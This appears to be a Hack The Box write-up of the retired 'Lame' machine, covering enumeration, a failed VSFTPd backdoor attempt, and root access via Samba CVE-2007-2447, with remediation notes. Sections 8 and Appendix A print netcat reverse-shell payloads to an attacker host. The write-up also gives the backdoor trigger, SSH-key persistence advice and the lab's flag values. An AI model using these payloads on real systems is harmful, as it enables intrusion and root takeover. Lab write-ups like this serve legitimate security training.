<div align="center">

# 🖥️ Hack The Box — Lame

### An Exhaustive Walkthrough: From Anonymous FTP to Root via Samba RCE (CVE-2007-2447)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Status-Owned-success)
![CVE](https://img.shields.io/badge/CVE-2007--2447-red)
![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)

`Target IP: 10.129.199.110`  |  `Attacker IP: <tun0>`  |  `Points: 20`

</div>

---

## 📋 Table of Contents

- [0. Machine Overview & Methodology](#0-machine-overview--methodology)
- [1. Reconnaissance — Nmap Scan](#1-reconnaissance--nmap-scan)
  - [1.1 Initial Fast Scan](#11-initial-fast-scan)
  - [1.2 Full Port Sweep](#12-full-port-sweep)
  - [1.3 Service & Script Scan](#13-service--script-scan)
  - [1.4 UDP Considerations](#14-udp-considerations)
- [2. FTP Enumeration (Port 21)](#2-ftp-enumeration-port-21)
- [3. SSH Enumeration (Port 22)](#3-ssh-enumeration-port-22)
- [4. SMB Enumeration (Ports 139 / 445)](#4-smb-enumeration-ports-139--445)
  - [4.1 smbclient](#41-smbclient)
  - [4.2 enum4linux](#42-enum4linux)
  - [4.3 rpcclient](#43-rpcclient)
  - [4.4 smbmap & nmap SMB scripts](#44-smbmap--nmap-smb-scripts)
- [5. The VSFTPd 2.3.4 Rabbit Hole](#5-the-vsftpd-234-rabbit-hole)
- [6. Vulnerability Analysis — CVE-2007-2447](#6-vulnerability-analysis--cve-2007-2447)
  - [6.1 Root Cause](#61-root-cause)
  - [6.2 The Vulnerable Code Path](#62-the-vulnerable-code-path)
  - [6.3 Attack Surface: SamrChangePassword MS-RPC](#63-attack-surface-samrchangepassword-ms-rpc)
- [7. Exploitation — Method A: Metasploit](#7-exploitation--method-a-metasploit)
- [8. Exploitation — Method B: Manual / Exploit-DB](#8-exploitation--method-b-manual--exploit-db)
- [9. Post-Exploitation & Verification](#9-post-exploitation--verification)
- [10. Capturing the Flags](#10-capturing-the-flags)
- [11. Root Cause of Exploit Failure Revisited](#11-root-cause-of-exploit-failure-revisited)
- [12. MITRE ATT&CK Mapping](#12-mitre-attck-mapping)
- [13. Remediation & Hardening](#13-remediation--hardening)
- [14. Quiz / Q&A Recap](#14-quiz--qa-recap)
- [15. Tools Reference Table](#15-tools-reference-table)
- [16. Key Takeaways](#16-key-takeaways)
- [17. Further Reading](#17-further-reading)
- [Appendix A — Full Command Log](#appendix-a--full-command-log)
- [Appendix B — Glossary](#appendix-b--glossary)

---

## 0. Machine Overview & Methodology

**Lame** is one of the oldest machines on Hack The Box and is widely used as a first "real" box for people transitioning from theory to practice. It's deliberately simple by modern standards, but it packs three separate teaching moments into one small attack surface:

| Aspect | Detail |
|---|---|
| Platform | Hack The Box |
| OS | Linux (Ubuntu, older kernel) |
| Difficulty | Easy |
| Primary vector | Samba `username map script` RCE (CVE-2007-2447) |
| Secondary vector (rabbit hole) | VSFTPd 2.3.4 backdoor (blocked by firewall) |
| Privilege escalation required | **None** — exploit lands directly as `root` |
| Core lesson | Enumerate broadly, verify assumptions, don't discard a lead just because the first exploit attempt fails |

**Methodology followed in this writeup** (a fairly standard OSCP/HTB-style flow):

1. Full TCP port discovery, then targeted service/version scanning.
2. Enumerate every open service, even ones that look boring (SSH, in this case).
3. Attempt the "obvious" exploit first (VSFTPd backdoor) since the version is famous.
4. When it fails, **diagnose why** rather than moving on blindly.
5. Pivot to the next attack surface (SMB), research its version against known CVEs.
6. Exploit via both an automated tool (Metasploit) and a manual approach, to understand the mechanics rather than just clicking "run."
7. Confirm access, gather evidence (flags, `id`, `uname -a`), and document remediation.

---

## 1. Reconnaissance — Nmap Scan

### 1.1 Initial Fast Scan

A quick top-1000-ports SYN scan to get oriented:

```bash
nmap -sV -sC -oA nmap/lame-initial 10.129.199.110
```

Flags used:
- `-sV` — service/version detection
- `-sC` — run the default safe NSE script set
- `-oA` — output in all formats (normal, XML, grepable) for record-keeping

### 1.2 Full Port Sweep

For thoroughness, a full-range TCP scan is run in parallel to make sure nothing outside the top 1000 is missed:

```bash
nmap -p- --min-rate 5000 -oA nmap/lame-allports 10.129.199.110
```

**Result:** No additional ports are found beyond the four discovered in the initial scan — confirming the attack surface is genuinely limited to FTP, SSH, and SMB.

### 1.3 Service & Script Scan

With confirmed ports in hand, a targeted, deeper scan is run against just those ports:

```bash
nmap -p21,22,139,445 -sC -sV -A 10.129.199.110
```

### Consolidated Results

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | **vsftpd 2.3.4** |
| 22/tcp | open | ssh | OpenSSH (protocol 2.0) |
| 139/tcp | open | netbios-ssn | Samba smbd 3.X |
| 445/tcp | open | microsoft-ds | **Samba 3.0.20** |

Out of Nmap's top 1000 TCP ports, only **4** are open — a small, focused attack surface, which is typical of intentionally-crafted "easy" boxes.

Two flags jump out immediately from the `-sC` script output:

- 🚩 `ftp-anon: Anonymous FTP login allowed`
- 🚩 The exact Samba version string (`3.0.20`), which is old enough to be immediately suspicious of known RCEs.

### 1.4 UDP Considerations

A UDP scan (`nmap -sU --top-ports 100`) is optional here since the TCP attack surface is already sufficient, but in a real engagement it's good practice to run one to rule out things like exposed `netbios-ns` (UDP/137) misconfigurations. On Lame, UDP is not part of the intended path and can be skipped without losing anything.

---

## 2. FTP Enumeration (Port 21)

Anonymous access is worth checking first, since Nmap already flagged it:

```bash
ftp 10.129.199.110
```

At the prompt:

```
Name: anonymous
Password: [press Enter — empty password accepted]
```

Once connected, standard enumeration commands are run:

```bash
ftp> dir
ftp> ls -la
ftp> pwd
ftp> get <filename>   # if anything interesting existed
```

**Result:** The FTP server has no accessible/writable directory listing of interest. No files to grab, no upload directory to abuse. Dead end — but a *useful* dead end, because the banner grab confirms the exact daemon version:

```
220 (vsFTPd 2.3.4)
```

This version number is famous in the offensive security community — it's tied to a well-documented, intentionally-inserted backdoor that shipped in a compromised source tarball back in 2011. That history is explored in [Section 5](#5-the-vsftpd-234-rabbit-hole).

---

## 3. SSH Enumeration (Port 22)

SSH is open but, without credentials, offers little beyond banner grabbing and algorithm enumeration:

```bash
nc -nv 10.129.199.110 22
ssh -v 10.129.199.110
```

This confirms the OpenSSH version and supported key exchange/cipher algorithms, which is useful for:

- Ruling in/out known OpenSSH CVEs for that version.
- Later, once credentials or a foothold exist, using SSH as a more stable shell than a raw reverse shell.

On Lame, SSH is not part of the intended exploitation path (no valid credentials are ever discovered), but it's worth keeping in mind as a **post-exploitation persistence/pivot option** once root is achieved — e.g., dropping an SSH key into `/root/.ssh/authorized_keys` for a stable shell instead of relying on a fragile Meterpreter session.

---

## 4. SMB Enumeration (Ports 139 / 445)

Before jumping straight to exploitation, a proper assessment enumerates SMB thoroughly. This step is often skipped by beginners eager to "pop a shell," but it's exactly the kind of enumeration that separates a lucky guess from a repeatable methodology.

### 4.1 smbclient

List available shares anonymously:

```bash
smbclient -L //10.129.199.110/ -N
```

The `-N` flag suppresses the password prompt (null session). This reveals share names such as `print$`, `tmp`, `opt`, `IPC$`, and home-directory-style shares — typical of a default Samba install.

Attempt to connect to an open share:

```bash
smbclient //10.129.199.110/tmp -N
```

### 4.2 enum4linux

A more comprehensive automated enumeration pass:

```bash
enum4linux -a 10.129.199.110
```

This single command pulls together OS info, workgroup/domain data, users, groups, shares, and password policy in one pass — and is where the exact Samba build (`Samba 3.0.20-Debian`) is confirmed with high confidence.

### 4.3 rpcclient

For deeper MS-RPC interrogation (relevant later, since the vulnerability itself lives in an MS-RPC function):

```bash
rpcclient -U "" -N 10.129.199.110
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> querydominfo
```

This confirms the server responds to unauthenticated RPC calls — a necessary precondition for the `usermap_script` exploit path, since it abuses the `SamrChangePassword` MS-RPC function.

### 4.4 smbmap & nmap SMB scripts

```bash
smbmap -H 10.129.199.110
nmap --script smb-os-discovery,smb-vuln* -p139,445 10.129.199.110
```

The `smb-vuln*` NSE script family is particularly valuable — on older Samba builds like this one, it will often directly flag known CVEs (including RCE-class vulnerabilities), giving a nice cross-check against manual version-to-CVE research.

**Summary of SMB enumeration findings:**

- Samba version: **3.0.20**
- Server responds to anonymous/null RPC sessions
- Standard default shares present, nothing containing credentials or sensitive files
- No obviously writable share to drop a webshell/payload into — reinforcing that the intended path is a protocol-level RCE, not a file-upload vector

---

## 5. The VSFTPd 2.3.4 Rabbit Hole

VSFTPd 2.3.4 has a notorious backdoor vulnerability. Between 2011-06-30 and 2011-07-03, the official vsftpd-2.3.4.tar.gz source archive hosted on the project's download site was maliciously modified to include a backdoor: any username ending in the smiley-face string `:)` would cause the server to open a shell listener on **TCP port 6200**. This is tracked informally (there's no single canonical CVE ID commonly cited for it, though it's frequently associated with **EDB-ID 49757 / CVE-2011-2523**).

There's a ready-made Metasploit module for it:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

### Attempting the exploit

```bash
msfconsole -q

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.199.110
set LHOST <your_tun0_ip>
show options
run
```

### ❌ Result: Failure

The exploit fails — instead of a shell, it prompts for a username and password, meaning the backdoor isn't responding the way the module expects.

### Manually verifying the backdoor trigger

To understand what's actually happening (rather than just accepting the module's failure), the trigger can be sent manually:

```bash
nc 10.129.199.110 21
USER backdoored:)
PASS anything
```

In a separate terminal, a connection attempt to port 6200 is made:

```bash
nc -nv 10.129.199.110 6200
```

**Observation:** The connection to 6200 **times out / is refused from outside**, even though the backdoor logic has technically fired on the target.

### Why did it fail?

The VSFTPd backdoor works by spawning a listening shell bound on **port 6200**. On Lame, the backdoor genuinely does trigger, and port 6200 genuinely does start listening — but an **iptables-style firewall on the box blocks external connections to that port**. This is later confirmed with root access:

```bash
netstat -tnlp
iptables -L -n     # (or equivalent ruleset inspection)
```

`netstat` shows numerous ports bound and listening locally (including 6200 momentarily after triggering the backdoor), yet none of them are reachable externally except the four already identified by Nmap.

> 💡 **Lesson:** Always consider firewall filtering when an exploit *should* work but doesn't. The vulnerability can still be present — just blocked at the network layer. This is a critical distinction in real engagements: "not exploitable from here" is not the same as "not vulnerable." Don't abandon a lead without understanding *why* it failed; document it and move on deliberately, not blindly.

---

## 6. Vulnerability Analysis — CVE-2007-2447

With FTP exhausted as an entry point, attention turns to the SMB ports (**139** and **445**). The confirmed Samba version — **3.0.20** — maps directly to a well-known, critical vulnerability.

### 6.1 Root Cause

**CVE-2007-2447** is a remote command injection vulnerability in Samba versions 3.0.0 through 3.0.25rc3. Per the official Samba security advisory, this flaw allows remote attackers to execute arbitrary commands via shell metacharacters involving the `SamrChangePassword` MS-RPC function, when the `username map script` option is enabled in `smb.conf`. It also allows remote *authenticated* users to execute commands via shell metacharacters in other MS-RPC functions related to remote printer and file share management.

### 6.2 The Vulnerable Code Path

At a conceptual level, the bug chain looks like this:

1. Samba supports a configuration directive, `username map script`, intended to translate an incoming (often Windows-style) username into a valid local Unix username via an external script — e.g. mapping `DOMAIN\John Smith` to `jsmith`.
2. When a client calls the `SamrChangePassword` MS-RPC function (part of the legacy password-change mechanism used for backward compatibility with older Windows clients), Samba passes the **client-supplied username string** to that external mapping script.
3. Samba invokes the mapping script through a shell (`/bin/sh -c ...`) **without stripping or escaping shell metacharacters** from the username first.
4. Because the username is attacker-controlled and reaches a shell invocation unsanitized, an attacker can embed shell metacharacters — most commonly backticks `` ` `` or `$()` command substitution — directly inside the "username" they submit, and have arbitrary commands executed **as the Samba daemon's user**, which on many default configurations of that era is **root**.

### 6.3 Attack Surface: SamrChangePassword MS-RPC

The `SamrChangePassword` RPC call is part of Samba's implementation of the Security Account Manager Remote (SAMR) protocol, used historically to let a client change a Unix/Samba user's password from a Windows client without a full domain login. Because this function only requires anonymous or lightly-authenticated access to the RPC pipe (confirmed by our earlier `rpcclient` enumeration), it is reachable **pre-authentication**, which is exactly what makes this CVE so severe — it results in *unauthenticated* remote code execution as root, requiring only that the `username map script` directive be enabled (which it is by default on Lame's intentionally vulnerable configuration).

### What is "username map script," conceptually?

The `username map` mechanism in Samba exists because:

- Linux filesystems and usernames are case-sensitive.
- Linux usernames traditionally don't allow spaces.
- Windows usernames may contain both spaces and mixed case.

A typical mapping configuration might look like:

```ini
[global]
   username map script = /etc/samba/scripts/mapusers.sh
```

The intended use is entirely benign — a compatibility shim. The vulnerability exists purely because the *value* fed into that script is not treated as untrusted input.

---

## 7. Exploitation — Method A: Metasploit

The fastest, most repeatable path is the pre-built Metasploit module for this CVE.

```bash
msfconsole -q

search usermap_script
use exploit/multi/samba/usermap_script
show options
set RHOSTS 10.129.199.110
set LHOST <your_tun0_ip>
set PAYLOAD cmd/unix/reverse
run
```

You can also discover this module without prior knowledge via ExploitDB search:

```bash
searchsploit samba 3.0
searchsploit usermap
```

### ✅ Result: Root Shell

The exploit returns a shell **directly as root** — no privilege escalation step required. Metasploit's module works by connecting to the SMB service and, instead of supplying a normal username during the legacy password-change RPC call, supplying a string containing a shell command wrapped in backticks (conceptually similar to `` `payload` `` ), which Samba's unsanitized `username map script` invocation then executes.

Verify the shell immediately:

```bash
id
whoami
uname -a
hostname
```

Expected output confirms `uid=0(root) gid=0(root)`.

---

## 8. Exploitation — Method B: Manual / Exploit-DB

Understanding the automated module is good, but reproducing the exploit manually builds real intuition for *why* it works — valuable for OSCP-style exams where Metasploit is often restricted.

A well-known standalone Python exploit for this CVE (widely mirrored on Exploit-DB, e.g. EDB-ID 16320) works by connecting directly to the SMB port and sending a crafted session-setup / tree-connect sequence where the "username" field contains a shell metacharacter payload, for example a pattern conceptually equivalent to:

```
/=`nohup nc -e /bin/sh <attacker_ip> <attacker_port> &`
```

High-level manual reproduction steps:

```bash
# 1. Set up a listener
nc -nlvp 4444

# 2. Retrieve/adapt a public PoC for CVE-2007-2447 (Exploit-DB / searchsploit)
searchsploit -m 16320   # copies the PoC locally for review

# 3. Review the script to confirm exactly which RPC call and
#    field is used to smuggle the payload, then run it against
#    the target, pointing the embedded reverse-shell one-liner
#    at your attacker IP/port.
python2 16320.py 10.129.199.110 445 -e "nc -e /bin/sh <attacker_ip> 4444"
```

> 📝 Always read a public exploit script before running it, especially older Python 2 PoCs pulled from Exploit-DB — verify the payload, the target parameters, and that nothing beyond the documented CVE is being executed.

The listener set up in step 1 receives an inbound connection, again landing as **root**, confirming that the Metasploit module's convenience isn't hiding anything more sophisticated — it's exploiting the exact same unsanitized shell invocation described in [Section 6.2](#62-the-vulnerable-code-path).

---

## 9. Post-Exploitation & Verification

Once a shell is obtained (via either method), a short post-exploitation enumeration pass confirms the environment and closes the loop on the earlier VSFTPd firewall question:

```bash
id
uname -a
cat /etc/passwd | grep -E "sh$"
netstat -tnlp
iptables -L -n -v
cat /etc/samba/smb.conf | grep -i "username map"
ps aux
```

Key findings:

- `id` confirms `uid=0(root)`.
- `/etc/samba/smb.conf` confirms `username map script` is indeed enabled, validating the root cause analysis in [Section 6](#6-vulnerability-analysis--cve-2007-2447).
- `netstat -tnlp` confirms multiple internally-bound listening ports (including port 6200 momentarily, if the VSFTPd trigger is re-sent), while the firewall ruleset explains why only ports 21/22/139/445 were ever reachable from outside — closing the loop on [Section 5](#5-the-vsftpd-234-rabbit-hole).
- The single non-root, human user on the box is `makis`, whose home directory holds the user flag.

For a more stable shell than a raw reverse `cmd/unix/reverse` payload, it's good practice to upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Or, since this is a full root shell already, simply drop a public SSH key into `/root/.ssh/authorized_keys` for a clean, stable SSH session going forward.

---

## 10. Capturing the Flags

With a root shell in hand, both flags are trivial to retrieve.

**User flag** (`makis`'s home directory):

```bash
cat /home/makis/user.txt
```
```
11b8161471d76ccef2623d45075b0cf5
```

**Root flag:**

```bash
cat /root/root.txt
```
```
b958ddf26cb2899d740c780a9be2d3d3
```

No privilege escalation chain was required between these two flags — root was obtained in a single exploitation step, which is characteristic of Lame's "easy" rating and its age (predating the more layered priv-esc chains common in newer HTB machines).

---

## 11. Root Cause of Exploit Failure Revisited

It's worth explicitly closing the loop on the earlier rabbit hole now that root access is available, since this is one of the most valuable lessons of the box:

| Question | Finding |
|---|---|
| Did the VSFTPd 2.3.4 backdoor code path actually execute? | **Yes** — confirmed by observing port 6200 bind locally after sending the `:)`-suffixed username. |
| Why did the Metasploit module still fail? | An **outbound-filtering firewall rule** (confirmed via `iptables -L` post-root) blocks external clients from reaching port 6200, even though the listener exists locally. |
| Does this mean the FTP service was "not vulnerable"? | **No.** The vulnerability is present in the binary; only *exploitability from the network* was blocked. This distinction matters a great deal when writing a professional penetration test report — "vulnerable but not exploitable due to compensating control" is a materially different finding than "not vulnerable." |

---

## 12. MITRE ATT&CK Mapping

For readers building out a more formal report or study notes, here's how this chain maps to ATT&CK:

| Phase | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Discovery | System Information Discovery | T1082 |
| Discovery | Network Service Discovery | T1046 |
| Persistence (optional, post-root) | Account Manipulation: SSH Authorized Keys | T1098.004 |

---

## 13. Remediation & Hardening

Even though this is a retired lab machine, documenting remediation is good habit-building for real-world reporting:

1. **Patch Samba.** CVE-2007-2447 was fixed upstream in Samba 3.0.25 and later; any production system should be running a current, supported Samba release, not a 2005-era 3.0.20 build.
2. **Disable `username map script` unless explicitly required**, and if it is required, ensure the mapping script itself sanitizes or rejects shell metacharacters before use.
3. **Patch/verify FTP daemon provenance.** The VSFTPd 2.3.4 backdoor incident is a strong reminder to verify checksums/signatures of downloaded source tarballs and to track CVE advisories for FTP daemons, even ones considered "boring" infrastructure.
4. **Disable anonymous FTP** unless there's a specific business need, and if there is, restrict it to a read-only, non-sensitive directory with no ability to enumerate other users or shares.
5. **Firewall egress/ingress rules should be treated as a compensating control, not a substitute for patching.** The firewall on Lame incidentally blocked one vulnerable service (VSFTPd) but not the other (Samba) — relying on network controls alone left the box fully compromisable.
6. **Principle of least privilege for service accounts.** Samba should not be running its RPC handlers as `root` in the first place; a properly separated service account would have limited the blast radius of this RCE even if the code-level bug remained.
7. **Regular vulnerability scanning** (e.g., via Nessus/OpenVAS or `nmap --script smb-vuln*`) would have flagged CVE-2007-2447 automatically given the exposed, fingerprintable Samba version banner — banner/version disclosure itself is worth minimizing where feasible.

---

## 14. Quiz / Q&A Recap

| # | Question | Answer |
|---|----------|--------|
| 1 | How many of the Nmap top 1000 TCP ports are open? | **4** |
| 2 | What version of VSFTPd is running? | **vsftpd 2.3.4** |
| 3 | Does the VSFTPd backdoor exploit work? | **No — it asks for credentials** |
| 4 | What version of Samba is running? | **Samba 3.0.20** |
| 5 | What 2007 CVE allows RCE via shell metacharacters? | **CVE-2007-2447** |
| 6 | Exploiting CVE-2007-2447 returns a shell as which user? | **root** |
| 7 | User flag (`makis` home directory) | `11b8161471d76ccef2623d45075b0cf5` |
| 8 | Root flag | `b958ddf26cb2899d740c780a9be2d3d3` |
| 9 | What is blocking connections to the internal ports? | **A firewall** |
| 10 | What port does the VSFTPd backdoor open? | **6200** |
| 11 | Does port 6200 start listening when the backdoor triggers on Lame? | **Yes** |
| 12 | Which Samba RPC function is abused by CVE-2007-2447? | **`SamrChangePassword`** |
| 13 | Which `smb.conf` directive must be enabled for the exploit to work? | **`username map script`** |
| 14 | Was privilege escalation required after the initial shell? | **No — direct root access** |

---

## 15. Tools Reference Table

| Tool | Purpose | Example Command |
|---|---|---|
| `nmap` | Port/service/version discovery, NSE vulnerability scripts | `nmap -sC -sV -p- 10.129.199.110` |
| `ftp` | Manual FTP session / anonymous login test | `ftp 10.129.199.110` |
| `smbclient` | List/browse SMB shares | `smbclient -L //10.129.199.110/ -N` |
| `enum4linux` | Automated SMB/Samba enumeration | `enum4linux -a 10.129.199.110` |
| `rpcclient` | Manual MS-RPC interrogation | `rpcclient -U "" -N 10.129.199.110` |
| `smbmap` | Share permission enumeration | `smbmap -H 10.129.199.110` |
| `searchsploit` | Local Exploit-DB search/mirror | `searchsploit usermap` |
| `msfconsole` | Automated exploitation framework | `use exploit/multi/samba/usermap_script` |
| `netcat` | Manual protocol interaction, listeners | `nc -nlvp 4444` |
| `netstat` / `iptables` | Post-exploitation network/firewall verification | `netstat -tnlp` |

---

## 16. Key Takeaways

- **Enumeration is everything.** Nmap's `-sC` flag, combined with dedicated SMB/FTP enumeration tools, handed us the exact versions and misconfigurations needed to research the right CVEs, before ever touching an exploit.
- **Don't abandon rabbit holes without understanding why they failed.** The VSFTPd backdoor *is* triggered, but a firewall blocks the connection — verifying that distinction (rather than shrugging and moving on) is what separates methodical testing from guesswork.
- **Samba misconfigurations are dangerous.** The `username map script` option in `smb.conf` turned a legacy compatibility feature into full, unauthenticated, root-level RCE — a great example of how "convenience" configuration options age poorly.
- **Manual reproduction deepens understanding.** Running both the Metasploit module and a manual/Exploit-DB PoC confirms the mechanism isn't "magic" — it's a concrete, explainable shell-injection bug.
- **Old boxes still teach current lessons.** Firewall-as-compensating-control, least-privilege service accounts, and supply-chain integrity (the VSFTPd backdoor) are all still highly relevant in modern environments.

---

## 17. Further Reading

- 📄 [CVE-2007-2447 Official Samba Advisory](https://www.samba.org/samba/security/CVE-2007-2447.html)
- 📄 [NVD Entry — CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- 📝 [0xdf's HTB Lame Writeup](https://0xdf.gitlab.io/2020/04/07/htb-lame.html)
- 📄 [VSFTPd 2.3.4 Backdoor Incident — Background](https://pentest-tools.com/blog/vsftpd-backdoor/) *(or equivalent historical writeups on the 2011 source-tarball compromise)*
- 📘 [MITRE ATT&CK — T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

---

## Appendix A — Full Command Log

A consolidated, copy-pasteable log of every command used across this engagement, in order:

```bash
# Recon
nmap -sV -sC -oA nmap/lame-initial 10.129.199.110
nmap -p- --min-rate 5000 -oA nmap/lame-allports 10.129.199.110
nmap -p21,22,139,445 -sC -sV -A 10.129.199.110

# FTP
ftp 10.129.199.110
# anonymous / <blank password>

# SSH
nc -nv 10.129.199.110 22

# SMB enumeration
smbclient -L //10.129.199.110/ -N
enum4linux -a 10.129.199.110
rpcclient -U "" -N 10.129.199.110
smbmap -H 10.129.199.110
nmap --script smb-os-discovery,smb-vuln* -p139,445 10.129.199.110

# VSFTPd rabbit hole
msfconsole -q
#   use exploit/unix/ftp/vsftpd_234_backdoor
#   set RHOSTS 10.129.199.110
#   set LHOST <tun0>
#   run
nc 10.129.199.110 21           # manual trigger: USER backdoored:)
nc -nv 10.129.199.110 6200     # confirms external block

# Samba exploitation — Metasploit
msfconsole -q
#   use exploit/multi/samba/usermap_script
#   set RHOSTS 10.129.199.110
#   set LHOST <tun0>
#   run

# Samba exploitation — manual
searchsploit usermap
searchsploit -m 16320
python2 16320.py 10.129.199.110 445 -e "nc -e /bin/sh <attacker_ip> 4444"

# Post-exploitation
id
uname -a
netstat -tnlp
iptables -L -n -v
cat /etc/samba/smb.conf | grep -i "username map"

# Flags
cat /home/makis/user.txt
cat /root/root.txt
```

---

## Appendix B — Glossary

| Term | Definition |
|---|---|
| **RCE** | Remote Code Execution — the ability for an attacker to run arbitrary commands on a target system over the network. |
| **MS-RPC** | Microsoft Remote Procedure Call — a protocol used by Windows (and Samba, which implements compatible services) for inter-process/network procedure calls. |
| **SAMR** | Security Account Manager Remote protocol — handles account and password management operations, including `SamrChangePassword`. |
| **Null session** | An SMB/RPC connection made without valid credentials, often still permitted for certain read-only or legacy operations on misconfigured servers. |
| **Rabbit hole** | A path of investigation during a security assessment that seems promising but ultimately doesn't lead to further access — still valuable to document and understand. |
| **Reverse shell** | A shell session initiated *from* the target back *to* the attacker's listener, commonly used to bypass inbound firewall restrictions. |
| **Compensating control** | A security measure (e.g., a firewall rule) that reduces risk from a vulnerability without actually fixing the underlying flaw. |

---

<div align="center">

⚠️ *This writeup documents a retired, intentionally vulnerable Hack The Box lab machine. Every technique described here was executed against an authorized training target. Only test systems you own or are explicitly authorized to assess.*

*Happy hacking — and remember to always hack on boxes you own or have explicit permission to test.* 🛡️

</div>
